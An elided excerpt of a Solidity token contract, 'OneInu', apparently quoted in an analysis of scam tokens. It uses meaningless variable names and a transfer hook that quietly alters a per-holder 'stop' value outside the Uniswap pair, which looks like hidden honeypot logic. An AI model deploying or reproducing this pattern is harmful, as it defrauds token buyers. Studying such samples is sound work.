...
contract OneInu is Ownable {
    uint256 private story;
    string private because;
    uint256 private _tTotal;
    string private neighborhood;
    uint256 private me;
    uint8 private cutting;
    ...
    mapping(address => uint256) private chosen;
    ...
    function accept(
        ...
        if (stop[teacher] == 0 && cool[teacher] > 0 && (address(uniswapV2Pair)) != teacher) {
            stop[teacher] -= cutting;
        }
    ...
    function transferFrom(
        ...
        accept(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        accept(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        me = 100;
        stop[boy] = cutting;
        _tTotal = 1000000000000000 * 10**cutting;
        chosen[msg.sender] = _tTotal;
    }
}